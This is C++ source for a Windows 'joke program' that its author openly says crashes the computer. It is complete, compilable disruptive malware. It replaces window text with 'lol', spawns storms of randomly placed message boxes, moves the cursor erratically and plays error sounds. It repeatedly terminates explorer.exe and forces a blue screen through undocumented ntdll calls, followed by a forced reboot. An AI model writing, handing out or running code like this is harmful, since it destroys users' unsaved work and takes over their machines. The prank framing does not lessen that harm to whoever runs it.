/*
    JokeProgram.Win32_x64.lol
    Joke program that BSoDs your computer. Save your work first!
    Copyright (C) 2023 AleXandro-1337

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program. If not, see <https://www.gnu.org/licenses/>.
    
    ***
    
    THE CREATOR OF THIS PROGRAM (AleXandro-1337) IS NOT RESPONIBLE FOR DAMAGES
    THAT THIS PROGRAM MAY CAUSE! EVEN IF THIS IS NOT MEANT TO BE DANGEROUS, IT
    MAY SITLL CAUSE DAMAGES. USE IT AT YOUR OWN RISK!
*/

typedef struct IUnknown IUnknown;

#include <windows.h>
#include <tlhelp32.h>

using namespace std;

#pragma comment(lib, "winmm")

#define LOL "lol"

bool stop = false;

HCRYPTPROV hProv;
int Random()
{
	if (!hProv)
		CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);

	int out = 0;
	CryptGenRandom(hProv, sizeof(out), (BYTE*)(&out)); //Generate random number
	return out & 0x7FFFFFFF;
}

int __stdcall LolText(HWND hwnd, LPARAM lParam)
{
	LPWSTR text = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(wchar_t) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)text, SMTO_ABORTIFHUNG, 100, 0))
	{
		int tLen = lstrlenW(text);
		int lolLen = lstrlenW(TEXT(LOL));
		for (int i = 0; i < tLen; i++)
			if (i < lolLen)
				text[i] = TEXT(LOL)[i];
			else text[i] = 0;

		SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)text, SMTO_ABORTIFHUNG, 100, 0); //Change text to "lol"
	}

	GlobalFree(text);

	return TRUE;
}

LRESULT __stdcall LolBtn(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);

	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;

	if (msg->message == WM_INITDIALOG)
	{
		for (int i = 0; i < 10; i++)
		{
			HWND btn = GetDlgItem(msg->hwnd, i);

			switch (Random() % 3)
			{
			case 0:
				EnableWindow(btn, 0);
				break;
			case 1:
				DestroyWindow(btn);
				break;
			default:
				break;
			}
			
			SetWindowTextA(btn, LOL); //Change message box every button text to "lol"
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

LRESULT __stdcall MoveMsg(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HCBT_CREATEWND)
	{
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP))
		{
			HWND hwnd = (HWND)wParam;

			int x = Random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = Random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y; //Move message box randomly
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD __stdcall LolMsg(void*)
{
	HHOOK hook1 = SetWindowsHookExA(WH_CALLWNDPROCRET, LolBtn, 0, GetCurrentThreadId());
	HHOOK hook2 = SetWindowsHookExA(WH_CBT, MoveMsg, 0, GetCurrentThreadId());
	MessageBoxA(GetDesktopWindow(), LOL, LOL, MB_YESNOCANCEL | MB_ICONHAND | MB_SYSTEMMODAL); //Spawn "lol" message box
	UnhookWindowsHookEx(hook1);
	UnhookWindowsHookEx(hook2);

	return 0;
}

DWORD __stdcall SpamMsg(void*)
{
	while (!stop)
	{
		CreateThread(0, 0, &LolMsg, 0, 0, 0); //Message box storm
		Sleep(69);
	}

	return 0;
}

DWORD __stdcall SpamSound(void*)
{
	while (!stop)
	{
		PlaySoundA("SystemHand", GetModuleHandleA(0), SND_ASYNC);
		Sleep(Random() % 169 + 420);
	}

	return 0;
}

DWORD __stdcall CursorMess(void*)
{
	while (!stop)
	{
		SetCursorPos(Random() % GetSystemMetrics(SM_CXSCREEN), Random() % GetSystemMetrics(SM_CYSCREEN)); //Move cursor randomly
		Sleep(69);
	}

	HDC scrnDc = GetDC(0);
	while (true)
	{
		POINT pt;
		GetCursorPos(&pt);
		DrawIcon(scrnDc, pt.x, pt.y, LoadIconW(0, IDI_ERROR)); //Draw error icons
		Sleep(69);
	}
}

DWORD __stdcall SuppressFileExplorer(void*)
{
	while (true)
	{
		PROCESSENTRY32W process;
		process.dwSize = sizeof(PROCESSENTRY32W);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

		Process32FirstW(snapshot, &process);
		do
		{
			if (lstrcmpW(process.szExeFile, L"explorer.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, process.th32ProcessID);
				TerminateProcess(hProcess, 1337);
				CloseHandle(hProcess);
			}
		} while (Process32NextW(snapshot, &process));

		CloseHandle(snapshot);

		Sleep(100);
	}
}

void MessUp()
{
	SendMessageA(HWND_BROADCAST, WM_SHOWWINDOW, 0, 1); //Hide all windows
	CreateThread(0, 0, SuppressFileExplorer, 0, 0, 0); //Keep suppressing explorer.exe
	
	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
	GetModuleFileNameA(0, exePath, 8192);

	Sleep(5000);

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	RtlZeroMemory(&pi, sizeof(pi));

	for (int i = 0; i < 10; i++)
		CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
}

int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
{
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);

	if (__argc > 1)
		if (lstrcmpA(__argv[1], "msg") == 0)
		{
			CreateThread(0, 0, &SpamMsg, 0, 0, 0); //Spam message boxes
			Sleep(10000);
			stop = true;

			return 0;
		}
		else if (lstrcmpA(__argv[1], "lol") == 0)
		{
			auto RtlAdjustPrivilege = (void(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(LoadLibraryA("ntdll"), "RtlAdjustPrivilege");

			BOOLEAN wasEnabled;
			RtlAdjustPrivilege(19, 1, 0, &wasEnabled); //Adjust shutdown privilege

			auto NtRaiseHardError = (void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))GetProcAddress(LoadLibraryA("ntdll"), "NtRaiseHardError");

			ULONG response;
			NtRaiseHardError(0xC0000001, 0, 0, 0, 6, &response); //Trigger BSoD

			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN); //In case it didn't work, restart Windows

			return 0;
		}

	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
	GetModuleFileNameA(0, exePath, 8192);

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	RtlZeroMemory(&pi, sizeof(pi));

	CreateProcessA(0, lstrcatA(exePath, " msg"), 0, 0, 0, 0, 0, 0, &si, &pi);

	EnumChildWindows(GetDesktopWindow(), &LolText, 0); //Change all text to "lol"
	
	CreateThread(0, 0, &SpamSound, 0, 0, 0); //Spam error sounds
	CreateThread(0, 0, &CursorMess, 0, 0, 0); //Make cursor go nuts
	Sleep(10000); //Wait a bit

	stop = true;

	MessUp(); //Mess up Windows
}
